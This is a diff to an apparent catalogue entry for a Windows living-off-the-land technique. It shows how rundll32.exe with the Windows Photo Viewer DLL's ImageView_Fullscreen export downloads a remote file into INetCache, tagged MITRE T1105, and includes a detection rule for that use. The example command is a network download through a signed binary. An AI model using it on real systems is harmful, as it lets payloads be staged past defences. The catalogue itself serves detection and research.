@@ -2,7 +2,8 @@
 id: windows-download-photoviewer
 namespace: windows:download:photoviewer
 name: photoviewer
-description: 'Windows Photo Viewer Located at: C:\Program Files\Windows Photo Viewer\PhotoViewer.dll; C:\Program Files (x86)\Windows Photo Viewer\PhotoViewer.dll.'
+description: 'Windows Photo Viewer Located at: C:\Program Files\Windows Photo Viewer\PhotoViewer.dll;
+  C:\Program Files (x86)\Windows Photo Viewer\PhotoViewer.dll.'
 author: Avihay Eldad
 version: 1.0.0
 capabilities:
@@ -41,7 +42,11 @@ resource_profile:
 allowed-tools:
 - photoviewer
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdout
 execution:
   template: photoviewer
   sandbox: execFile
@@ -49,8 +54,11 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL. (Download file from remote location.)
-  command: rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
+- description: Once executed, rundll32.exe will download the file at the specified
+    URL to the user's INetCache folder using the Windows Photo Viewer DLL. (Download
+    file from remote location.)
+  command: rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen
+    {REMOTEURL}
 references: []
 techniques:
 - exfiltration
@@ -58,14 +66,14 @@ mitre_ids:
 - T1105
 detections:
 - type: ioc
-  description: Execution of rundll32.exe with 'ImageView_Fullscreen' and a remote URL (containing '://') as an argument
+  description: Execution of rundll32.exe with 'ImageView_Fullscreen' and a remote
+    URL (containing '://') as an argument
 install:
 - method: choco
   package_name: photoviewer
   commands:
   - choco install photoviewer
 ---
-
 
 # photoviewer
 
